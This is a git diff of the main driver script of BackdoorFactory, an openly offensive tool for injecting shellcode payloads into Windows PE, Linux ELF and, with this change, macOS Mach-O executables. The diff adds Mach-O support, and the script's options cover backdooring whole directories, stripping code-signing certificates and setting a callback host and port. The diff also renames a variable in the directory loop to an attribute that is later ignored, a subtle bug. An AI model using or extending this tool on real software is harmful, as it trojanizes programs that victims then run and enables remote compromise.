@@ -1,39 +1,45 @@
 #!/usr/bin/env python
 '''
-    BackdoorFactory (BDF) v2 - Tertium Quid 
+BackdoorFactory (BDF) v2 - Tertium Quid
 
-    Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
-    Without him, I would still be trying to do stupid things 
-    with the elf format.
-    Also thanks to Silvio Cesare with his 1998 paper 
-    (http://vxheaven.org/lib/vsc01.html) which these ELF patching
-    techniques are based on.
+Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
+Without him, I would still be trying to do stupid things
+with the elf format.
 
-    Special thanks to Travis Morrow for poking holes in my ideas.
+Also thanks to Silvio Cesare with his 1998 paper
+(http://vxheaven.org/lib/vsc01.html) which these ELF patching
+techniques are based on.
 
-    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-   
-    Copyright (C) 2013,2014, Joshua Pitts
+Special thanks to Travis Morrow for poking holes in my ideas.
 
-    License:   GPLv3
+Copyright (c) 2013-2014, Joshua Pitts
+All rights reserved.
 
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
+Redistribution and use in source and binary forms, with or without modification,
+are permitted provided that the following conditions are met:
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
+    1. Redistributions of source code must retain the above copyright notice,
+    this list of conditions and the following disclaimer.
 
-    See <http://www.gnu.org/licenses/> for a copy of the GNU General
-    Public License
+    2. Redistributions in binary form must reproduce the above copyright notice,
+    this list of conditions and the following disclaimer in the documentation
+    and/or other materials provided with the distribution.
 
-    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
-    This program is to be used for only legal activities by IT security
-    professionals and researchers. Author not responsible for malicious
-    uses.
+    3. Neither the name of the copyright holder nor the names of its contributors
+    may be used to endorse or promote products derived from this software without
+    specific prior written permission.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+POSSIBILITY OF SUCH DAMAGE.
 
 '''
 
@@ -45,7 +51,7 @@ from random import choice
 from optparse import OptionParser
 from pebin import pebin
 from elfbin import elfbin
-
+from machobin import machobin
 
 def signal_handler(signal, frame):
         print '\nProgram Exit'
@@ -55,7 +61,7 @@ def signal_handler(signal, frame):
 class bdfMain():
 
     version = """\
-         2.2.0
+         2.3.1
          """
 
     author = """\
@@ -66,62 +72,62 @@ class bdfMain():
 
     #ASCII ART
     menu = ["-.(`-')  (`-')  _           <-"
-        ".(`-') _(`-')                            (`-')\n"
-        "__( OO)  (OO ).-/  _         __( OO)"
-        "( (OO ).->     .->        .->   <-.(OO )  \n"
-        "'-'---.\  / ,---.   \-,-----.'-'. ,--"
-        ".\    .'_ (`-')----. (`-')----. ,------,) \n"
-        "| .-. (/  | \ /`.\   |  .--./|  .'   /"
-        "'`'-..__)( OO).-.  '( OO).-.  '|   /`. ' \n"
-        "| '-' `.) '-'|_.' | /_) (`-')|      /)"
-        "|  |  ' |( _) | |  |( _) | |  ||  |_.' | \n"
-        "| /`'.  |(|  .-.  | ||  |OO )|  .   ' |"
-        "  |  / : \|  |)|  | \|  |)|  ||  .   .' \n"
-        "| '--'  / |  | |  |(_'  '--'\|  |\   \|"
-        "  '-'  /  '  '-'  '  '  '-'  '|  |\  \  \n"
-        "`------'  `--' `--'   `-----'`--' '--'"
-        "`------'    `-----'    `-----' `--' '--' \n"
-        "           (`-')  _           (`-')     "
-        "              (`-')                    \n"
-        "   <-.     (OO ).-/  _        ( OO).-> "
-        "      .->   <-.(OO )      .->           \n"
-        "(`-')-----./ ,---.   \-,-----./    '._"
-        "  (`-')----. ,------,) ,--.'  ,-.        \n"
-        "(OO|(_\---'| \ /`.\   |  .--./|'--...__)"
-        "( OO).-.  '|   /`. '(`-')'.'  /        \n"
-        " / |  '--. '-'|_.' | /_) (`-')`--.  .--'"
-        "( _) | |  ||  |_.' |(OO \    /         \n"
-        " \_)  .--'(|  .-.  | ||  |OO )   |  |   "
-        " \|  |)|  ||  .   .' |  /   /)         \n"
-        "  `|  |_)  |  | |  |(_'  '--'\   |  |    "
-        " '  '-'  '|  |\  \  `-/   /`          \n"
-        "   `--'    `--' `--'   `-----'   `--'    "
-        "  `-----' `--' '--'   `--'            \n",
+            ".(`-') _(`-')                            (`-')\n"
+            "__( OO)  (OO ).-/  _         __( OO)"
+            "( (OO ).->     .->        .->   <-.(OO )  \n"
+            "'-'---.\  / ,---.   \-,-----.'-'. ,--"
+            ".\    .'_ (`-')----. (`-')----. ,------,) \n"
+            "| .-. (/  | \ /`.\   |  .--./|  .'   /"
+            "'`'-..__)( OO).-.  '( OO).-.  '|   /`. ' \n"
+            "| '-' `.) '-'|_.' | /_) (`-')|      /)"
+            "|  |  ' |( _) | |  |( _) | |  ||  |_.' | \n"
+            "| /`'.  |(|  .-.  | ||  |OO )|  .   ' |"
+            "  |  / : \|  |)|  | \|  |)|  ||  .   .' \n"
+            "| '--'  / |  | |  |(_'  '--'\|  |\   \|"
+            "  '-'  /  '  '-'  '  '  '-'  '|  |\  \  \n"
+            "`------'  `--' `--'   `-----'`--' '--'"
+            "`------'    `-----'    `-----' `--' '--' \n"
+            "           (`-')  _           (`-')     "
+            "              (`-')                    \n"
+            "   <-.     (OO ).-/  _        ( OO).-> "
+            "      .->   <-.(OO )      .->           \n"
+            "(`-')-----./ ,---.   \-,-----./    '._"
+            "  (`-')----. ,------,) ,--.'  ,-.        \n"
+            "(OO|(_\---'| \ /`.\   |  .--./|'--...__)"
+            "( OO).-.  '|   /`. '(`-')'.'  /        \n"
+            " / |  '--. '-'|_.' | /_) (`-')`--.  .--'"
+            "( _) | |  ||  |_.' |(OO \    /         \n"
+            " \_)  .--'(|  .-.  | ||  |OO )   |  |   "
+            " \|  |)|  ||  .   .' |  /   /)         \n"
+            "  `|  |_)  |  | |  |(_'  '--'\   |  |    "
+            " '  '-'  '|  |\  \  `-/   /`          \n"
+            "   `--'    `--' `--'   `-----'   `--'    "
+            "  `-----' `--' '--'   `--'            \n",
 
-        "__________               "
-        " __       .___                   \n"
-        "\______   \_____    ____ "
-        "|  | __ __| _/____   ___________ \n"
-        " |    |  _/\__  \ _/ ___\|"
-        "  |/ // __ |/  _ \ /  _ \_  __ \ \n"
-        " |    |   \ / __ \\\\  \__"
-        "_|    </ /_/ (  <_> |  <_> )  | \/\n"
-        " |______  /(____  /\___  >"
-        "__|_ \____ |\____/ \____/|__|   \n"
-        "        \/      \/     \/"
-        "     \/    \/                    \n"
-        "___________              "
-        "__                               \n"
-        "\_   _____/____    _____/"
-        "  |_  ___________ ___.__.        \n"
-        " |    __) \__  \ _/ ___\ "
-        "  __\/  _ \_  __ <   |  |        \n"
-        " |     \   / __ \\\\  \__"
-        "_|  | (  <_> )  | \/\___  |        \n"
-        " \___  /  (____  /\___  >_"
-        "_|  \____/|__|   / ____|        \n"
-        "     \/        \/     \/  "
-        "                 \/             \n"]
+            "__________               "
+            " __       .___                   \n"
+            "\______   \_____    ____ "
+            "|  | __ __| _/____   ___________ \n"
+            " |    |  _/\__  \ _/ ___\|"
+            "  |/ // __ |/  _ \ /  _ \_  __ \ \n"
+            " |    |   \ / __ \\\\  \__"
+            "_|    </ /_/ (  <_> |  <_> )  | \/\n"
+            " |______  /(____  /\___  >"
+            "__|_ \____ |\____/ \____/|__|   \n"
+            "        \/      \/     \/"
+            "     \/    \/                    \n"
+            "___________              "
+            "__                               \n"
+            "\_   _____/____    _____/"
+            "  |_  ___________ ___.__.        \n"
+            " |    __) \__  \ _/ ___\ "
+            "  __\/  _ \_  __ <   |  |        \n"
+            " |     \   / __ \\\\  \__"
+            "_|  | (  <_> )  | \/\___  |        \n"
+            " \___  /  (____  /\___  >_"
+            "_|  \____/|__|   / ____|        \n"
+            "     \/        \/     \/  "
+            "                 \/             \n"]
 
     signal.signal(signal.SIGINT, signal_handler)
 
@@ -129,7 +135,7 @@ class bdfMain():
     parser.add_option("-f", "--file", dest="FILE", action="store",
                       type="string",
                       help="File to backdoor")
-    parser.add_option("-s", "--shell", default="show", dest="SHELL", 
+    parser.add_option("-s", "--shell", default="show", dest="SHELL",
                       action="store", type="string",
                       help="Payloads that are available for use."
                       " Use 'show' to see payloads."
@@ -224,7 +230,7 @@ class bdfMain():
                       help="For debug information output.")
     parser.add_option("-T", "--image-type", dest="IMAGE_TYPE", default="ALL",
                       type='string',
-                      action="store", help="ALL, x32, or x64 type binaries only. Default=ALL")
+                      action="store", help="ALL, x86, or x64 type binaries only. Default=ALL")
     parser.add_option("-Z", "--zero_cert", dest="ZERO_CERT", default=True, action="store_false",
                       help="Allows for the overwriting of the pointer to the PE certificate table"
                       " effectively removing the certificate from the binary for all intents"
@@ -237,11 +243,19 @@ class bdfMain():
                       )
     parser.add_option("-L", "--patch_dll", dest="PATCH_DLL", default=True, action="store_false",
                       help="Use this setting if you DON'T want to patch DLLs. Patches by default."
-                     )
+                      )
+    parser.add_option("-F", "--FAT_PRIORITY", dest="FAT_PRIORITY", default="x64", action="store",
+                      help="For MACH-O format. If fat file, focus on which arch to patch. Default "
+                      "is x64. To force x86 use -F x86, to force both archs use -F ALL."
+                      )
 
     (options, args) = parser.parse_args()
 
     def basicDiscovery(FILE):
+        macho_supported = ['\xcf\xfa\xed\xfe', '\xca\xfe\xba\xbe',
+                           '\xce\xfa\xed\xfe',
+                           ]
+
         testBinary = open(FILE, 'rb')
         header = testBinary.read(4)
         testBinary.close()
@@ -249,11 +263,11 @@ class bdfMain():
             return 'PE'
         elif 'ELF' in header:
             return 'ELF'
+        elif header in macho_supported:
+            return "MACHO"
         else:
-            'Only support ELF and PE file formats'
+            'Only support ELF, PE, and MACH-O file formats'
             return None
-        
-    
 
     if options.NO_BANNER is False:
         print choice(menu)
@@ -271,29 +285,29 @@ class bdfMain():
                 is_supported = basicDiscovery(options.FILE)
                 if is_supported is "PE":
                     supported_file = pebin(options.FILE,
-                                            options.OUTPUT,
-                                            options.SHELL,
-                                            options.NSECTION,
-                                            options.DISK_OFFSET,
-                                            options.ADD_SECTION,
-                                            options.CAVE_JUMPING,
-                                            options.PORT,
-                                            options.HOST,
-                                            options.SUPPLIED_SHELLCODE,
-                                            options.INJECTOR,
-                                            options.CHANGE_ACCESS,
-                                            options.VERBOSE,
-                                            options.SUPPORT_CHECK,
-                                            options.SHELL_LEN,
-                                            options.FIND_CAVES,
-                                            options.SUFFIX,
-                                            options.DELETE_ORIGINAL,
-                                            options.CAVE_MINER,
-                                            options.IMAGE_TYPE,
-                                            options.ZERO_CERT,
-                                            options.CHECK_ADMIN,
-                                            options.PATCH_DLL
-                                            )
+                                           options.OUTPUT,
+                                           options.SHELL,
+                                           options.NSECTION,
+                                           options.DISK_OFFSET,
+                                           options.ADD_SECTION,
+                                           options.CAVE_JUMPING,
+                                           options.PORT,
+                                           options.HOST,
+                                           options.SUPPLIED_SHELLCODE,
+                                           options.INJECTOR,
+                                           options.CHANGE_ACCESS,
+                                           options.VERBOSE,
+                                           options.SUPPORT_CHECK,
+                                           options.SHELL_LEN,
+                                           options.FIND_CAVES,
+                                           options.SUFFIX,
+                                           options.DELETE_ORIGINAL,
+                                           options.CAVE_MINER,
+                                           options.IMAGE_TYPE,
+                                           options.ZERO_CERT,
+                                           options.CHECK_ADMIN,
+                                           options.PATCH_DLL
+                                           )
                 elif is_supported is "ELF":
                     supported_file = elfbin(options.FILE,
                                             options.OUTPUT,
@@ -306,7 +320,17 @@ class bdfMain():
                                             options.SUPPLIED_SHELLCODE,
                                             options.IMAGE_TYPE
                                             )
-                                        
+                elif is_supported is "MACHO":
+                    supported_file = machobin(options.FILE,
+                                              options.OUTPUT,
+                                              options.SHELL,
+                                              options.HOST,
+                                              options.PORT,
+                                              options.SUPPORT_CHECK,
+                                              options.SUPPLIED_SHELLCODE,
+                                              options.FAT_PRIORITY
+                                              )
+
                 if options.SUPPORT_CHECK is True:
                     if os.path.isfile(options.FILE):
                         is_supported = False
@@ -324,7 +348,7 @@ class bdfMain():
                 #    if supported_file.flItms['runas_admin'] is True:
                 #        print "%s must be run as admin." % options.FILE
                 print "*" * 50
-        
+
         if options.SUPPORT_CHECK is True:
             sys.exit()
 
@@ -339,40 +363,40 @@ class bdfMain():
             for item in dirlisting:
                 #print item
                 print "*" * 50
-                options.FILE = options.DIR + '/' + item
+                options.File = options.DIR + '/' + item
                 if os.path.isdir(options.FILE) is True:
                     print "Directory found, continuing"
                     continue
-                
+
                 print ("backdooring file %s" % item)
                 result = None
                 is_supported = basicDiscovery(options.FILE)
                 try:
                     if is_supported is "PE":
                         supported_file = pebin(options.FILE,
-                                                options.OUTPUT,
-                                                options.SHELL,
-                                                options.NSECTION,
-                                                options.DISK_OFFSET,
-                                                options.ADD_SECTION,
-                                                options.CAVE_JUMPING,
-                                                options.PORT,
-                                                options.HOST,
-                                                options.SUPPLIED_SHELLCODE,
-                                                options.INJECTOR,
-                                                options.CHANGE_ACCESS,
-                                                options.VERBOSE,
-                                                options.SUPPORT_CHECK,
-                                                options.SHELL_LEN,
-                                                options.FIND_CAVES,
-                                                options.SUFFIX,
-                                                options.DELETE_ORIGINAL,
-                                                options.CAVE_MINER,
-                                                options.IMAGE_TYPE,
-                                                options.ZERO_CERT,
-                                                options.CHECK_ADMIN,
-                                                options.PATCH_DLL
-                                                )
+                                               options.OUTPUT,
+                                               options.SHELL,
+                                               options.NSECTION,
+                                               options.DISK_OFFSET,
+                                               options.ADD_SECTION,
+                                               options.CAVE_JUMPING,
+                                               options.PORT,
+                                               options.HOST,
+                                               options.SUPPLIED_SHELLCODE,
+                                               options.INJECTOR,
+                                               options.CHANGE_ACCESS,
+                                               options.VERBOSE,
+                                               options.SUPPORT_CHECK,
+                                               options.SHELL_LEN,
+                                               options.FIND_CAVES,
+                                               options.SUFFIX,
+                                               options.DELETE_ORIGINAL,
+                                               options.CAVE_MINER,
+                                               options.IMAGE_TYPE,
+                                               options.ZERO_CERT,
+                                               options.CHECK_ADMIN,
+                                               options.PATCH_DLL
+                                               )
                         supported_file.OUTPUT = None
                         supported_file.output_options()
                         result = supported_file.patch_pe()
@@ -388,10 +412,25 @@ class bdfMain():
                                                 options.SUPPLIED_SHELLCODE,
                                                 options.IMAGE_TYPE
                                                 )
+
                         supported_file.OUTPUT = None
                         supported_file.output_options()
                         result = supported_file.patch_elf()
-                    
+
+                    elif is_supported is "MACHO":
+                        supported_file = machobin(options.FILE,
+                                                  options.OUTPUT,
+                                                  options.SHELL,
+                                                  options.HOST,
+                                                  options.PORT,
+                                                  options.SUPPORT_CHECK,
+                                                  options.SUPPLIED_SHELLCODE,
+                                                  options.FAT_PRIORITY
+                                                  )
+                        supported_file.OUTPUT = None
+                        supported_file.output_options()
+                        result = supported_file.patch_macho()
+
                     if result is None:
                         print 'Not Supported. Continuing'
                         continue
@@ -399,36 +438,36 @@ class bdfMain():
                         print ("[*] File {0} is in backdoored "
                                "directory".format(supported_file.FILE))
                 except Exception as e:
-                    print "DIR ERROR",str(e)
+                    print "DIR ERROR", str(e)
         else:
             print("Goodbye")
 
         sys.exit()
-    
+
     if options.INJECTOR is True:
         supported_file = pebin(options.FILE,
-                                options.OUTPUT,
-                                options.SHELL,
-                                options.NSECTION,
-                                options.DISK_OFFSET,
-                                options.ADD_SECTION,
-                                options.CAVE_JUMPING,
-                                options.PORT,
-                                options.HOST,
-                                options.SUPPLIED_SHELLCODE,
-                                options.INJECTOR,
-                                options.CHANGE_ACCESS,
-                                options.VERBOSE,
-                                options.SUPPORT_CHECK,
-                                options.SHELL_LEN,
-                                options.FIND_CAVES,
-                                options.SUFFIX,
-                                options.DELETE_ORIGINAL,
-                                options.IMAGE_TYPE,
-                                options.ZERO_CERT,
-                                options.CHECK_ADMIN,
-                                options.PATCH_DLL
-                                )
+                               options.OUTPUT,
+                               options.SHELL,
+                               options.NSECTION,
+                               options.DISK_OFFSET,
+                               options.ADD_SECTION,
+                               options.CAVE_JUMPING,
+                               options.PORT,
+                               options.HOST,
+                               options.SUPPLIED_SHELLCODE,
+                               options.INJECTOR,
+                               options.CHANGE_ACCESS,
+                               options.VERBOSE,
+                               options.SUPPORT_CHECK,
+                               options.SHELL_LEN,
+                               options.FIND_CAVES,
+                               options.SUFFIX,
+                               options.DELETE_ORIGINAL,
+                               options.IMAGE_TYPE,
+                               options.ZERO_CERT,
+                               options.CHECK_ADMIN,
+                               options.PATCH_DLL
+                               )
         supported_file.injector()
         sys.exit()
 
@@ -440,29 +479,29 @@ class bdfMain():
     is_supported = basicDiscovery(options.FILE)
     if is_supported is "PE":
         supported_file = pebin(options.FILE,
-                                options.OUTPUT,
-                                options.SHELL,
-                                options.NSECTION,
-                                options.DISK_OFFSET,
-                                options.ADD_SECTION,
-                                options.CAVE_JUMPING,
-                                options.PORT,
-                                options.HOST,
-                                options.SUPPLIED_SHELLCODE,
-                                options.INJECTOR,
-                                options.CHANGE_ACCESS,
-                                options.VERBOSE,
-                                options.SUPPORT_CHECK,
-                                options.SHELL_LEN,
-                                options.FIND_CAVES,
-                                options.SUFFIX,
-                                options.DELETE_ORIGINAL,
-                                options.CAVE_MINER,
-                                options.IMAGE_TYPE,
-                                options.ZERO_CERT,
-                                options.CHECK_ADMIN,
-                                options.PATCH_DLL
-                                )
+                               options.OUTPUT,
+                               options.SHELL,
+                               options.NSECTION,
+                               options.DISK_OFFSET,
+                               options.ADD_SECTION,
+                               options.CAVE_JUMPING,
+                               options.PORT,
+                               options.HOST,
+                               options.SUPPLIED_SHELLCODE,
+                               options.INJECTOR,
+                               options.CHANGE_ACCESS,
+                               options.VERBOSE,
+                               options.SUPPORT_CHECK,
+                               options.SHELL_LEN,
+                               options.FIND_CAVES,
+                               options.SUFFIX,
+                               options.DELETE_ORIGINAL,
+                               options.CAVE_MINER,
+                               options.IMAGE_TYPE,
+                               options.ZERO_CERT,
+                               options.CHECK_ADMIN,
+                               options.PATCH_DLL
+                               )
     elif is_supported is "ELF":
         supported_file = elfbin(options.FILE,
                                 options.OUTPUT,
@@ -476,8 +515,22 @@ class bdfMain():
                                 options.IMAGE_TYPE
                                 )
 
+    elif is_supported is "MACHO":
+        supported_file = machobin(options.FILE,
+                                  options.OUTPUT,
+                                  options.SHELL,
+                                  options.HOST,
+                                  options.PORT,
+                                  options.SUPPORT_CHECK,
+                                  options.SUPPLIED_SHELLCODE,
+                                  options.FAT_PRIORITY
+                                  )
+
+    else:
+        print "Not supported."
+        sys.exit()
     result = supported_file.run_this()
-    if result is True:
+    if result is True and options.SUPPORT_CHECK is False:
         print "File {0} is in the 'backdoored' directory".format(supported_file.FILE)
 
 
